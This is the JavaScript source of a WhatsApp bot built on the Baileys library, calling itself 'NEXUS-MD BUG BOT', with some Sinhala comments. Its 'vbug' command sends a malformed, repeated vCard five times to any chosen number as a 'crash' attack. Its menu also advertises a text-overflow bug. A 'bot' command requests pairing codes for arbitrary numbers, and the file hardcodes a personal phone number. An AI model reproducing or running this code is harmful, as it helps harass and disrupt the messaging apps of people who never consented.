const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    getContentType,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Nexus-V3", "Chrome", "3.0.0"]
    });

    // --- මුල්ම Pairing එක (94770475809) ---
    if (!sock.authState.creds.registered) {
        const myNumber = "94770475809"; 
        setTimeout(async () => {
            let code = await sock.requestPairingCode(myNumber);
            console.log(`\n🔥 NEXUS-MD PAIRING CODE: ${code}\n`);
        }, 3000);
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'open') console.log('✅ Nexus-MD is Online & Ready!');
    });

    sock.ev.on('messages.upsert', async (chat) => {
        const msg = chat.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        
        const from = msg.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const type = getContentType(msg.message);
        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : '';
        
        if (isGroup) return; // Private විතරයි

        const prefix = ".";
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);

        // --- MENU COMMAND ---
        if (command === 'menu' || command === 'help') {
            const menuText = `⚡ *NEXUS-MD BUG BOT V3.1* ⚡\n\n` +
                           `👋 *Hello Brō!* ලෝකෙම හොල්ලන බග් සිස්ටම් එක මෙන්න.\n\n` +
                           `👾 *COMMAND LIST:* \n` +
                           ` ◈ ${prefix}bot [number] - Get Pairing Code\n` +
                           ` ◈ ${prefix}bug [number] - Text Overflow Bug\n` +
                           ` ◈ ${prefix}vbug [number] - Ultra Vcard Crash\n` +
                           ` ◈ ${prefix}ping - Check Speed\n\n` +
                           `🚀 *Owner:* Sasiya MD\n` +
                           `🛡️ *Status:* Anti-Ban Active`;
            
            await sock.sendMessage(from, { 
                text: menuText,
                contextInfo: {
                    externalAdReply: {
                        title: "NEXUS BUG SYSTEM",
                        body: "Created by Sasiya MD",
                        mediaType: 1,
                        thumbnailUrl: "https://files.catbox.moe/6v0m3q.jpg"
                    }
                }
            });
        }

        // --- PUBLIC PAIRING CODE ---
        if (command === 'bot') {
            let targetNum = args[0]?.replace(/[^0-9]/g, '');
            if (!targetNum) return sock.sendMessage(from, { text: "❌ නම්බර් එකත් එක්ක ගහපන් බන්." });

            sock.sendMessage(from, { text: "⏳ පෝලිමේ ඉන්න... කෝඩ් එක හදනවා." });
            const { state: tState } = await useMultiFileAuthState(`temp_${targetNum}`);
            const tSock = makeWASocket({ auth: tState, logger: pino({ level: "silent" }) });

            setTimeout(async () => {
                let code = await tSock.requestPairingCode(targetNum);
                await sock.sendMessage(from, { text: `🔥 *YOUR PAIRING CODE:* ${code}` });
            }, 3000);
        }

        // --- ULTRA VCARD BUG (LOKEMA SUPIRI) ---
        if (command === 'vbug') {
            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            sock.sendMessage(from, { text: "💀 Vcard Attack Started..." });

            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 
                          'FN:NEXUS CRASH ⚰️\n' + 
                          'ORG:NEXUS-MD;\n' + 
                          'TEL;type=CELL;type=VOICE;waid=94770475809:+94 77 047 5809\n' + 
                          'END:VCARD'.repeat(100); // Vcard එක 100 පාරක් Repeat කරලා දරුණු කරනවා

            for (let i = 0; i < 5; i++) {
                await sock.sendMessage(target, { contacts: { displayName: 'NEXUS CRASH', contacts: [{ vcard }] } });
                await new Promise(r => setTimeout(r, 1000));
            }
            sock.sendMessage(from, { text: "✅ Vcard Attack Done!" });
        }
    });
}

startNexus();
